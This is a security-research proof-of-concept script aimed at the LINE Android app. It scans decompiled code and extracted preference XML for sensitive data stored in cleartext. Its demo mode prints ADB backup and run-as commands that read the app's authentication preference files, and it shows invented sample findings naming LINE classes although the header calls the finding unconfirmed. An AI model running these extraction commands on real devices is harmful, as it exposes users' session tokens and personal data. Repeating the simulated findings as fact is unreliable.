#!/usr/bin/env python3
"""
================================================================================
PoC-02 | Insecure Data Storage — SharedPreferences Plaintext Exposure
================================================================================
Vulnerability : CWE-312 — Cleartext Storage of Sensitive Information
Severity      : HIGH | CVSS 7.5 (AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
Target        : jp.naver.line.android SharedPreferences XML files
Attack Vector : Rooted device / ADB backup extraction / Physical access

This PoC demonstrates two attack vectors:
  1. Static: Scan decompiled Smali code for insecure SharedPreferences writes
  2. Dynamic: Parse extracted SharedPreferences XML files for sensitive data

EDUCATIONAL PURPOSE ONLY
Version       : 1.0  (February 2026)
Author        : deepquest
Blog          : https://deepquest.code511.com/blog/
Target App    : jp.naver.line.android v26.1.1 (260110123)
Note          : SharedPreferences plaintext storage scanner — investigative (finding unconfirmed)
================================================================================
"""

import os
import re
import sys
import json
import argparse
import xml.etree.ElementTree as ET
from pathlib import Path
from dataclasses import dataclass, asdict
from typing import Optional

BANNER = r"""
 ____  ___   ____      ___  ____
|  _ \/ _ \ / ___|    / _ \|___ \
| |_) | | | | |      | | | | __) |
|  __/| |_| | |___   | |_| |/ __/
|_|    \___/ \____|   \___/|_____|

  SharedPreferences Plaintext Storage PoC
  CWE-312 | CVSS 7.5 | HIGH
"""

# Sensitivity classification of SharedPreferences keys
SENSITIVE_KEY_PATTERNS = {
    "CRITICAL": [
        r"(?i)(password|passwd|pwd)",
        r"(?i)(secret|private_key|signing_key)",
        r"(?i)(credit_card|cvv|card_number)",
    ],
    "HIGH": [
        r"(?i)(token|access_token|auth_token|session_token|refresh_token)",
        r"(?i)(api_key|apikey|api_secret)",
        r"(?i)(session|session_id|sid)",
        r"(?i)(oauth|bearer)",
        r"(?i)(mid|user_id|account_id)",            # LINE uses 'mid' for user ID
    ],
    "MEDIUM": [
        r"(?i)(phone|phone_number|mobile)",
        r"(?i)(email|mail_address)",
        r"(?i)(name|display_name|username)",
        r"(?i)(device_id|udid|imei|android_id)",
        r"(?i)(pin|otp|verification_code)",
    ],
    "LOW": [
        r"(?i)(pref|preference|setting|config)",
        r"(?i)(flag|enable|disable|toggle)",
    ],
}

# Smali patterns that indicate insecure SharedPreferences usage
SMALI_INSECURE_PATTERNS = {
    "plaintext_write": [
        r"invoke-virtual \{.*\}, Landroid/content/SharedPreferences\$Editor;->putString\(",
        r"invoke-virtual \{.*\}, Landroid/content/SharedPreferences\$Editor;->putInt\(",
        r"invoke-virtual \{.*\}, Landroid/content/SharedPreferences\$Editor;->putLong\(",
        r"invoke-virtual \{.*\}, Landroid/content/SharedPreferences\$Editor;->putBoolean\(",
    ],
    "insecure_mode": [
        r"MODE_WORLD_READABLE",          # Globally readable — critical flaw
        r"MODE_WORLD_WRITEABLE",         # Globally writeable
        r"MODE_MULTI_PROCESS",           # Deprecated, insecure
    ],
    "secure_alternative_missing": [
        r"EncryptedSharedPreferences",   # Should be present — if absent, unencrypted
        r"MasterKey",                    # Jetpack Security MasterKey
        r"AndroidKeyStore",              # Keystore-backed encryption
    ],
}


@dataclass
class Finding:
    severity: str
    type: str
    key: str
    value: str
    file: str
    description: str
    remediation: str


def classify_key_sensitivity(key: str) -> tuple[str, str]:
    """Return (severity, reason) for a given SharedPreferences key name."""
    for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        for pattern in SENSITIVE_KEY_PATTERNS[severity]:
            if re.search(pattern, key):
                return severity, f"Key '{key}' matches {severity} sensitivity pattern"
    return "INFO", f"Key '{key}' — no sensitive pattern matched"


def redact_value(key: str, value: str) -> str:
    """Partially redact sensitive values for safe logging."""
    severity, _ = classify_key_sensitivity(key)
    if severity in ("CRITICAL", "HIGH") and value and len(value) > 4:
        visible = max(4, len(value) // 4)
        return value[:visible] + "*" * (len(value) - visible)
    return value


def parse_shared_prefs_xml(xml_path: str) -> list[Finding]:
    """
    Parse a SharedPreferences XML file and identify sensitive data
    stored in plaintext.
    """
    findings = []
    try:
        tree = ET.parse(xml_path)
        root = tree.getroot()
    except ET.ParseError as e:
        print(f"  [!] XML parse error in {xml_path}: {e}")
        return findings

    file_name = os.path.basename(xml_path)

    for elem in root:
        key   = elem.get("name", "")
        value = elem.get("value", elem.text or "")

        if not key:
            continue

        severity, reason = classify_key_sensitivity(key)

        if severity in ("CRITICAL", "HIGH", "MEDIUM"):
            findings.append(Finding(
                severity    = severity,
                type        = "Plaintext Storage in SharedPreferences",
                key         = key,
                value       = redact_value(key, str(value)),
                file        = file_name,
                description = f"{reason}. Value stored unencrypted in XML.",
                remediation = "Use EncryptedSharedPreferences with AES256-GCM + AES256-SIV key scheme."
            ))

    return findings


def scan_smali_for_insecure_prefs(smali_dir: str) -> dict:
    """
    Scan decompiled Smali files for insecure SharedPreferences usage patterns.
    Returns a report of dangerous calls and missing security controls.
    """
    report = {
        "plaintext_writes": [],
        "insecure_modes":   [],
        "secure_apis_found": [],
        "verdict": "UNKNOWN",
    }

    smali_path = Path(smali_dir)
    if not smali_path.exists():
        print(f"  [!] Smali directory not found: {smali_dir}")
        return report

    smali_files = list(smali_path.rglob("*.smali"))
    print(f"  [*] Scanning {len(smali_files)} Smali files...")

    for smali_file in smali_files:
        try:
            content = smali_file.read_text(errors="replace")
        except IOError:
            continue

        rel_path = str(smali_file.relative_to(smali_path))

        for pattern in SMALI_INSECURE_PATTERNS["plaintext_write"]:
            for match in re.finditer(pattern, content):
                # Get surrounding context (line number + nearby const-string)
                line_num = content[:match.start()].count("\n") + 1
                context_start = max(0, match.start() - 200)
                context_end   = min(len(content), match.end() + 200)
                context_block = content[context_start:context_end]
                # Extract key name from nearby const-string
                key_match = re.search(r'const-string [vp]\d+, "([^"]+)"', context_block)
                key_name  = key_match.group(1) if key_match else "unknown"

                report["plaintext_writes"].append({
                    "file":    rel_path,
                    "line":    line_num,
                    "key":     key_name,
                    "snippet": match.group().strip()[:100],
                    "sensitivity": classify_key_sensitivity(key_name)[0],
                })

        for pattern in SMALI_INSECURE_PATTERNS["insecure_mode"]:
            if re.search(pattern, content):
                line_num = content[:re.search(pattern, content).start()].count("\n") + 1
                report["insecure_modes"].append({
                    "file": rel_path,
                    "line": line_num,
                    "mode": pattern,
                })

        for api in SMALI_INSECURE_PATTERNS["secure_alternative_missing"]:
            if re.search(api, content):
                report["secure_apis_found"].append({"api": api, "file": rel_path})

    # Verdict
    has_insecure = bool(report["plaintext_writes"] or report["insecure_modes"])
    has_secure   = bool(report["secure_apis_found"])

    if has_insecure and not has_secure:
        report["verdict"] = "VULNERABLE — No encrypted SharedPreferences found"
    elif has_insecure and has_secure:
        report["verdict"] = "PARTIAL — Mixed secure and insecure usage detected"
    elif not has_insecure and has_secure:
        report["verdict"] = "SECURE — EncryptedSharedPreferences in use"
    else:
        report["verdict"] = "INCONCLUSIVE — No SharedPreferences usage detected"

    return report


def simulate_adb_extraction_demo():
    """
    Simulate what an attacker would retrieve via ADB backup or root access.
    Shows the exact commands and expected vulnerable output.
    """
    print("\n" + "─" * 68)
    print("  ATTACK SIMULATION — ADB Backup Extraction")
    print("─" * 68)

    adb_commands = [
        ("Step 1: Trigger ADB backup (no root needed on unlocked devices)",
         "adb backup -noapk jp.naver.line.android -f line_backup.ab"),
        ("Step 2: Convert Android Backup format to tar",
         "dd if=line_backup.ab bs=1 skip=24 | python3 -c \\\n"
         "  \"import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))\" \\\n"
         "  | tar xvf -"),
        ("Step 3: Navigate to SharedPreferences",
         "ls apps/jp.naver.line.android/sp/"),
        ("Step 4: Read authentication preferences",
         "cat apps/jp.naver.line.android/sp/talk.sp"),
        ("Step 5 (Root): Direct adb shell access",
         "adb shell run-as jp.naver.line.android \\\n"
         "  cat /data/data/jp.naver.line.android/shared_prefs/auth_prefs.xml"),
    ]

    for description, command in adb_commands:
        print(f"\n  [{description}]")
        print(f"  $ {command}")

    print("\n  ─── SIMULATED VULNERABLE SharedPreferences XML CONTENT ───")
    vulnerable_xml_demo = """<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <!-- HIGH SEVERITY — Authentication token in plaintext -->
    <string name="access_token">line_oauth_XXXXXXXX_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</string>

    <!-- HIGH SEVERITY — Session identifier -->
    <string name="session_id">sess_XXXXXXXXXXXXXXXXXXXXXXXX</string>

    <!-- HIGH SEVERITY — User MID (LINE unique user identifier) -->
    <string name="mid">u1234567890abcdef1234567890abcdef</string>

    <!-- MEDIUM SEVERITY — Phone number linked to account -->
    <string name="registered_phone">+XX-XXXXXXXXXX</string>

    <!-- HIGH SEVERITY — Device auth certificate -->
    <string name="device_cert">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...</string>

    <!-- LOW SEVERITY — Profile data (still PII) -->
    <string name="display_name">John Doe</string>
    <string name="email">john.doe@example.com</string>

    <!-- CRITICAL if not salted — password hash -->
    <string name="pin_hash">5f4dcc3b5aa765d61d8327deb882cf99</string>
</map>"""
    for line in vulnerable_xml_demo.strip().split("\n"):
        print(f"  {line}")


def demo_mode():
    print("\n[DEMO MODE] — Simulating SharedPreferences analysis for LINE\n")
    simulate_adb_extraction_demo()

    print("\n\n" + "─" * 68)
    print("  SIMULATED SMALI SCAN RESULTS")
    print("─" * 68)

    demo_smali = {
        "plaintext_writes": [
            {"file": "smali/jp/naver/line/android/auth/AuthManager.smali",
             "line": 142, "key": "access_token",
             "snippet": "invoke-virtual {v0}, Landroid/content/SharedPreferences$Editor;->putString(",
             "sensitivity": "HIGH"},
            {"file": "smali/jp/naver/line/android/auth/AuthManager.smali",
             "line": 158, "key": "session_id",
             "snippet": "invoke-virtual {v0}, Landroid/content/SharedPreferences$Editor;->putString(",
             "sensitivity": "HIGH"},
            {"file": "smali/jp/naver/line/android/user/ProfileManager.smali",
             "line": 89, "key": "mid",
             "snippet": "invoke-virtual {v0}, Landroid/content/SharedPreferences$Editor;->putString(",
             "sensitivity": "HIGH"},
            {"file": "smali/jp/naver/line/android/pin/PinManager.smali",
             "line": 211, "key": "pin_hash",
             "snippet": "invoke-virtual {v0}, Landroid/content/SharedPreferences$Editor;->putString(",
             "sensitivity": "CRITICAL"},
        ],
        "insecure_modes": [],
        "secure_apis_found": [],  # EncryptedSharedPreferences NOT found — VULNERABLE
        "verdict": "VULNERABLE — No encrypted SharedPreferences found",
    }

    print(f"\n  Verdict: *** {demo_smali['verdict']} ***")
    print(f"\n  Plaintext writes to SharedPreferences: {len(demo_smali['plaintext_writes'])}")
    for pw in demo_smali["plaintext_writes"]:
        print(f"    [{pw['sensitivity']}] key='{pw['key']}' @ {pw['file']}:{pw['line']}")

    print("\n  Secure API usage (EncryptedSharedPreferences): NOT FOUND")
    print("\n  ─── REMEDIATION ───")
    print("""
  Replace insecure writes with EncryptedSharedPreferences:

  // VULNERABLE (current):
  SharedPreferences prefs = getSharedPreferences("auth", MODE_PRIVATE);
  prefs.edit().putString("access_token", token).apply();

  // SECURE (recommended):
  MasterKey masterKey = new MasterKey.Builder(context)
      .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
      .build();
  SharedPreferences encPrefs = EncryptedSharedPreferences.create(
      context, "auth_secure",
      masterKey,
      EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
      EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
  );
  encPrefs.edit().putString("access_token", token).apply();
""")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(
        description="PoC-02: Insecure SharedPreferences plaintext storage analysis"
    )
    parser.add_argument("--smali",    help="Path to decompiled Smali directory")
    parser.add_argument("--prefs-dir",help="Directory containing extracted .xml SharedPreferences files")
    parser.add_argument("--xml",      help="Single SharedPreferences XML file to analyze")
    parser.add_argument("--out",      help="Output JSON file", default="sharedprefs_report.json")
    parser.add_argument("--demo",     action="store_true")
    args = parser.parse_args()

    if args.demo or (not args.smali and not args.prefs_dir and not args.xml):
        demo_mode()
        return

    all_findings = []

    if args.xml:
        print(f"\n[+] Analyzing XML: {args.xml}")
        all_findings.extend(parse_shared_prefs_xml(args.xml))

    if args.prefs_dir:
        xml_files = list(Path(args.prefs_dir).glob("*.xml"))
        print(f"\n[+] Analyzing {len(xml_files)} SharedPreferences XML files in {args.prefs_dir}")
        for xml_file in xml_files:
            all_findings.extend(parse_shared_prefs_xml(str(xml_file)))

    if args.smali:
        print(f"\n[+] Scanning Smali code: {args.smali}")
        smali_report = scan_smali_for_insecure_prefs(args.smali)
        print(f"\n  Verdict : {smali_report['verdict']}")
        print(f"  Plaintext writes : {len(smali_report['plaintext_writes'])}")
        print(f"  Insecure modes   : {len(smali_report['insecure_modes'])}")
        print(f"  Secure APIs      : {len(smali_report['secure_apis_found'])}")

    if all_findings:
        print(f"\n[+] XML Analysis — {len(all_findings)} sensitive keys found:")
        for f in sorted(all_findings, key=lambda x: ["CRITICAL","HIGH","MEDIUM","LOW","INFO"].index(x.severity)):
            print(f"  [{f.severity}] key='{f.key}'  value='{f.value}'  file='{f.file}'")

    output = {"findings": [asdict(f) for f in all_findings]}
    with open(args.out, "w") as fp:
        json.dump(output, fp, indent=2)
    print(f"\n[+] Report saved to: {args.out}")


if __name__ == "__main__":
    main()
